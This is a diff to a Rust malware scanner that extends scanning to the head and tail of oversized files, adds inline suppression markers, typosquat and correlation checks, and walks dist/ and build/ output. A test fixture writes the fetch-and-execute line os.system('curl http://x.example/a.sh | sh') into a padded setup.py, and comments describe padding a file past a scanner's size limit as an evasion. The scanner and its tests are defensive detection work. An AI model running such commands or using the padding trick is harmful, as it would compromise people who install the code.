@@ -1,9 +1,14 @@
 pub mod cloud_sigs;
 pub mod context;
+pub mod correlate;
 pub mod derive;
+pub mod manifests;
 pub mod normalize;
 pub mod phases;
+pub mod profile;
 pub mod scoring;
+pub mod suppress;
+pub mod typosquat;
 
 use ignore::WalkBuilder;
 use rayon::prelude::*;
@@ -411,6 +416,22 @@ pub struct ScanResult {
     /// degrades gracefully rather than assuming it is present.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub scanner: Option<ScannerInfo>,
+    /// Findings silenced by an inline `sigil:ignore` marker (see
+    /// `scanner::suppress`). Kept separate from the ledger's all-or-nothing
+    /// `suppressed_findings` because they are per-finding decisions with
+    /// their own attribution, and must survive ledger re-evaluation.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub inline_suppressed: Vec<Finding>,
+    /// One attribution per inline-suppressed finding:
+    /// `file:line RULE-ID — reason`.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub inline_suppressions: Vec<String>,
+    /// What the tree is, judged from its shallowest manifest: `npm`, `pypi`,
+    /// `agent-skill`, `mcp-server`, `claude-plugin`, `vscode-extension`,
+    /// `agent-instructions`, `cargo`, `go`, `maven`, `rubygems` or
+    /// `generic`. Empty on results written by an older binary.
+    #[serde(default, skip_serializing_if = "String::is_empty")]
+    pub platform: String,
 }
 
 /// Provenance of a scan: which engine and which detection corpus ran.
@@ -451,12 +472,15 @@ fn severity_from_name(name: &str) -> Option<Severity> {
 /// Directories that are never content-scanned: vendored/generated trees whose
 /// contents produce noise without manifest context (ADR-0008). Dependency
 /// *manifests* (package.json, lockfiles) at the project root are still scanned.
+///
+/// `dist/` and `build/` are deliberately absent. In a published npm package
+/// they *are* the shipped code (230 of the 844 malicious packages in the
+/// evaluation set carry files under `dist/`), and in a git checkout the
+/// project's own `.gitignore` already keeps build output out of the walk.
 const DEFAULT_EXCLUDED_DIRS: &[&str] = &[
     "node_modules",
     ".git",
     "target",
-    "dist",
-    "build",
     ".next",
     "__pycache__",
     ".venv",
@@ -466,9 +490,80 @@ const DEFAULT_EXCLUDED_DIRS: &[&str] = &[
     ".pytest_cache",
 ];
 
-/// Files larger than this are skipped for content scanning (still visible to
-/// the Provenance phase, which flags oversized files).
+/// Files larger than this are not read whole for content scanning. They are
+/// not skipped either: see [`oversized_excerpt`].
 const MAX_CONTENT_SCAN_BYTES: u64 = 10_000_000;
+
+/// How much of each end of an oversized file is still scanned. Padding a
+/// script past a scanner's size cap is a cheap evasion — the evaluation set
+/// has a 22 MB `setup.py` that writes an executable from one enormous bytes
+/// literal and runs it on the line after — and the payload sits at one end
+/// or the other of the padding, never inside it.
+const OVERSIZED_EXCERPT_BYTES: usize = 2_000_000;
+
+/// Past this even the excerpt is skipped; the Provenance phase still sees the
+/// file's size.
+const OVERSIZED_MAX_BYTES: u64 = 512_000_000;
+
+/// The scanned parts of an oversized file.
+struct OversizedExcerpt {
+    head: String,
+    tail: String,
+    /// Newlines before the tail starts: tail line `i` (1-based) is file
+    /// line `tail_line_offset + i`.
+    tail_line_offset: usize,
+}
+
+/// Read the first and last [`OVERSIZED_EXCERPT_BYTES`] of a text file and
+/// count the newlines in between, so tail findings carry real line numbers.
+/// Returns `None` for binary content or a file past [`OVERSIZED_MAX_BYTES`].
+fn oversized_excerpt(path: &Path, len: u64) -> Option<OversizedExcerpt> {
+    use std::io::{Read, Seek, SeekFrom};
+    if len > OVERSIZED_MAX_BYTES {
+        return None;
+    }
+    let mut file = std::fs::File::open(path).ok()?;
+    let mut head = vec![0u8; OVERSIZED_EXCERPT_BYTES];
+    let mut filled = 0;
+    while filled < head.len() {
+        match file.read(&mut head[filled..]) {
+            Ok(0) => break,
+            Ok(n) => filled += n,
+            Err(_) => return None,
+        }
+    }
+    head.truncate(filled);
+    if head.contains(&0) {
+        return None;
+    }
+    let excerpt = OVERSIZED_EXCERPT_BYTES as u64;
+    let tail_start = len.saturating_sub(excerpt).max(excerpt);
+    let mut newlines = head.iter().filter(|b| **b == b'\n').count();
+    let mut pos = excerpt;
+    let mut buf = vec![0u8; 1 << 20];
+    while pos < tail_start {
+        let want = ((tail_start - pos) as usize).min(buf.len());
+        match file.read(&mut buf[..want]) {
+            Ok(0) => break,
+            Ok(n) => {
+                newlines += buf[..n].iter().filter(|b| **b == b'\n').count();
+                pos += n as u64;
+            }
+            Err(_) => return None,
+        }
+    }
+    file.seek(SeekFrom::Start(tail_start)).ok()?;
+    let mut tail = Vec::new();
+    file.read_to_end(&mut tail).ok()?;
+    if tail.contains(&0) {
+        tail.clear();
+    }
+    Some(OversizedExcerpt {
+        head: String::from_utf8_lossy(&head).into_owned(),
+        tail: String::from_utf8_lossy(&tail).into_owned(),
+        tail_line_offset: newlines,
+    })
+}
 
 /// Collect candidate files honoring `.gitignore` (only inside real git repos —
 /// `require_git(true)` — so a malicious `.gitignore` inside an extracted
@@ -551,29 +646,41 @@ pub fn run_scan(
     } else {
         path
     };
+    let platform = manifests::detect_platform(strip_base, &files).to_string();
 
     if should_run_phase(Phase::Provenance) {
         findings.extend(phases::scan_provenance(strip_base, &files));
+        findings.extend(typosquat::scan(strip_base, &files));
     }
 
     // Content phases run per-file in parallel; collect() preserves file order
-    // so results stay deterministic.
-    let per_file: Vec<Vec<Finding>> = files
+    // so results stay deterministic. Each file yields its active findings and
+    // the ones an inline `sigil:ignore` marker set aside, with attribution.
+    type FileOutcome = (Vec<Finding>, Vec<(Finding, String)>);
+    let per_file: Vec<FileOutcome> = files
         .par_iter()
         .map(|file_path| {
-            let contents = match std::fs::metadata(file_path) {
-                Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => return Vec::new(),
+            let none: FileOutcome = (Vec::new(), Vec::new());
+            // An oversized file yields its head as `contents` and its tail
+            // separately; a normal file yields its whole text and no tail.
+            let (contents, tail) = match std::fs::metadata(file_path) {
+                Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => {
+                    match oversized_excerpt(file_path, meta.len()) {
+                        Some(ex) => (ex.head, Some((ex.tail, ex.tail_line_offset))),
+                        None => return none,
+                    }
+                }
                 Ok(_) => match std::fs::read(file_path) {
                     Ok(bytes) => {
                         // Skip binary files (contains null bytes) and use lossy UTF-8
                         if bytes.contains(&0) {
-                            return Vec::new();
+                            return none;
                         }
-                        String::from_utf8_lossy(&bytes).into_owned()
+                        (String::from_utf8_lossy(&bytes).into_owned(), None)
                     }
-                    Err(_) => return Vec::new(),
+                    Err(_) => return none,
                 },
-                Err(_) => return Vec::new(),
+                Err(_) => return none,
             };
 
             let rel_path = file_path
@@ -584,13 +691,21 @@ pub fn run_scan(
 
             let mut file_findings: Vec<Finding> = Vec::new();
 
+            // SKILL-007: a skill or MCP manifest that does not parse.
+            if should_run_phase(Phase::SkillSecurity) {
+                file_findings.extend(manifests::malformed_manifest(&rel_path, &contents));
+            }
+
             // Invisible-Unicode inspection runs on the RAW contents, then all
             // pattern phases match against the de-cloaked form so zero-width
             // splitting cannot hide tokens like `eval(` (ADR-0008).
             if should_run_phase(Phase::Obfuscation) {
                 file_findings.extend(normalize::inspect_invisible(&rel_path, &contents));
             }
-            let contents = normalize::normalize_for_matching(&contents);
+            // Owned copy of the normalised text: the worklist takes one copy,
+            // and the marker parser and the correlation pass read the other.
+            let source_text: String = normalize::normalize_for_matching(&contents).into_owned();
+            let markers = suppress::parse_markers(&source_text);
 
             // Analysis is a bounded worklist, not a single pass. A phase that
             // decodes something enqueues the decoded content, and every phase
@@ -599,7 +714,7 @@ pub fn run_scan(
             // instead of only tripping one obfuscation rule on its shape.
             let mut budget = derive::DeriveBudget::new();
             let mut queue: Vec<derive::DerivedUnit> = vec![derive::DerivedUnit {
-                contents: contents.into_owned(),
+                contents: source_text.clone(),
                 via: String::new(),
                 parent_line: 0,
                 depth: 0,
@@ -629,11 +744,55 @@ pub fn run_scan(
                 }
             }
 
-            file_findings
+            // The tail of an oversized file is scanned once, without the
+            // decode worklist, and its findings are re-numbered onto the
+            // real lines of the file.
+            if let Some((tail_text, offset)) = tail {
+                let tail_norm = normalize::normalize_for_matching(&tail_text);
+                let tail_findings =
+                    run_phases(&rel_path, &tail_norm, &should_run_phase, &cloud_sigs);
+                file_findings.extend(tail_findings.into_iter().map(|mut f| {
+                    f.line = f.line.map(|l| l + offset);
+                    f.snippet = format!("[tail of oversized file] {}", f.snippet);
+                    f
+                }));
+            }
+
+            // A marker on the line that carried an encoded blob also covers
+            // findings decoded out of it, because those are re-anchored to
+            // that line above.
+            let (mut kept, mut silenced) = suppress::apply(&markers, file_findings);
+
+            // Correlation runs over the findings a reviewer has not already
+            // dismissed, and its own findings can be dismissed the same way.
+            let lines: Vec<&str> = source_text.lines().collect();
+            let chains = correlate::apply(
+                &crate::corpus::compiled::corpus().correlation_rules,
+                &kept,
+                &lines,
+            );
+            let (chain_kept, mut chain_silenced) = suppress::apply(&markers, chains);
+            kept.extend(chain_kept);
+            silenced.append(&mut chain_silenced);
+            (kept, silenced)
         })
         .collect();
 
-    findings.extend(per_file.into_iter().flatten());
+    let mut inline_suppressed: Vec<Finding> = Vec::new();
+    let mut inline_suppressions: Vec<String> = Vec::new();
+    for (kept, silenced) in per_file {
+        findings.extend(kept);
+        for (f, note) in silenced {
+            inline_suppressed.push(f);
+            inline_suppressions.push(note);
+        }
+    }
+
+    // A lifecycle script that runs a file with findings is its own finding,
+    // one level above the worst of them: that code executes on install,
+    // whether or not the package is ever imported.
+    let links = manifests::link_install_referenced(strip_base, &files, &findings);
+    findings.extend(links);
 
     if let Some(min) = min_sev {
         findings.retain(|f| f.severity >= min);
@@ -642,6 +801,7 @@ pub fn run_scan(
     let duration_ms = start.elapsed().as_millis() as u64;
 
     assign_fingerprints(&mut findings);
+    assign_fingerprints(&mut inline_suppressed);
 
     // Known-good recognition (ADR-0011). Findings in files that are
     // byte-identical to published releases move to `suppressed_findings` with
@@ -719,6 +879,9 @@ pub fn run_scan(
             corpus_rule_count: compiled.rule_count(),
             rule_ids: compiled.rule_ids(),
         }),
+        inline_suppressed,
+        inline_suppressions,
+        platform,
     }
 }
 
@@ -805,6 +968,48 @@ mod phase_registry_tests {
 }
 
 #[cfg(test)]
+mod oversized_tests {
+    use super::*;
+    use std::io::Write;
+
+    /// A 10 MB+ setup.py with the payload after one enormous literal: the
+    /// old behaviour skipped the file entirely, so the payload was never
+    /// seen and only PROV-004 (Low) fired.
+    #[test]
+    fn oversized_script_head_and_tail_are_scanned_with_real_line_numbers() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("setup.py");
+        let mut f = std::fs::File::create(&path).unwrap();
+        f.write_all(b"import os\n").unwrap();
+        f.write_all(b"blob = b'").unwrap();
+        let chunk = vec![b'A'; 1 << 20];
+        for _ in 0..11 {
+            f.write_all(&chunk).unwrap();
+        }
+        f.write_all(b"'\n").unwrap();
+        f.write_all(b"os.system('curl http://x.example/a.sh | sh')\n")
+            .unwrap();
+        f.write_all(b"setup(name='x')\n").unwrap();
+        drop(f);
+        assert!(std::fs::metadata(&path).unwrap().len() > MAX_CONTENT_SCAN_BYTES);
+
+        let result = run_scan(dir.path(), None, None);
+        let tail_hit = result
+            .findings
+            .iter()
+            .find(|f| f.rule == "CODE-014")
+            .expect("os.system in the tail must be found");
+        assert_eq!(tail_hit.line, Some(3), "{tail_hit:?}");
+        assert!(tail_hit.snippet.starts_with("[tail of oversized file] "));
+        assert!(
+            result.findings.iter().any(|f| f.rule == "PROV-007"),
+            "a megabyte setup.py is itself a finding: {:?}",
+            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+    }
+}
+
+#[cfg(test)]
 mod walker_tests {
     use super::*;
     use std::fs;
@@ -822,6 +1027,8 @@ mod walker_tests {
         touch(&root.join("node_modules/evil/index.js"));
         touch(&root.join("target/debug/x.rs"));
         touch(&root.join(".next/server/page.js"));
+        // Build output is shipped code in a published package, so it is
+        // walked; only a real git checkout's .gitignore keeps it out.
         touch(&root.join("dist/bundle.js"));
 
         let files = collect_files(root);
@@ -829,7 +1036,7 @@ mod walker_tests {
             .iter()
             .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().to_string())
             .collect();
-        assert_eq!(rels, vec!["src/main.js"]);
+        assert_eq!(rels, vec!["dist/bundle.js", "src/main.js"]);
     }
 
     #[test]
@@ -879,6 +1086,44 @@ mod walker_tests {
             .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().to_string())
             .collect();
         assert!(rels.contains(&"payload.js".to_string()));
+    }
+}
+
+#[cfg(test)]
+mod inline_suppression_tests {
+    use super::*;
+    use std::fs;
+
+    /// The marker on a flagged line moves that finding — and only that
+    /// finding — out of the active set, with attribution.
+    #[test]
+    fn marker_moves_finding_to_inline_suppressed() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        fs::write(
+            root.join("app.py"),
+            "import os\n\
+             os.system(cmd)  # sigil:ignore CODE-014 -- argv is validated above\n\
+             eval(expr)\n",
+        )
+        .unwrap();
+
+        let result = run_scan(root, None, None);
+        assert!(
+            !result.findings.iter().any(|f| f.rule == "CODE-014"),
+            "CODE-014 should be suppressed: {:?}",
+            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+        assert!(result.findings.iter().any(|f| f.rule == "CODE-001"));
+        assert_eq!(result.inline_suppressed.len(), 1);
+        assert_eq!(result.inline_suppressed[0].rule, "CODE-014");
+        assert_eq!(
+            result.inline_suppressions[0],
+            "app.py:2 CODE-014 — argv is validated above"
+        );
+        assert!(!result.inline_suppressed[0].fingerprint.is_empty());
+        // Score and verdict are computed over the active set only.
+        assert_eq!(result.score, scoring::calculate_score(&result.findings));
     }
 }
 
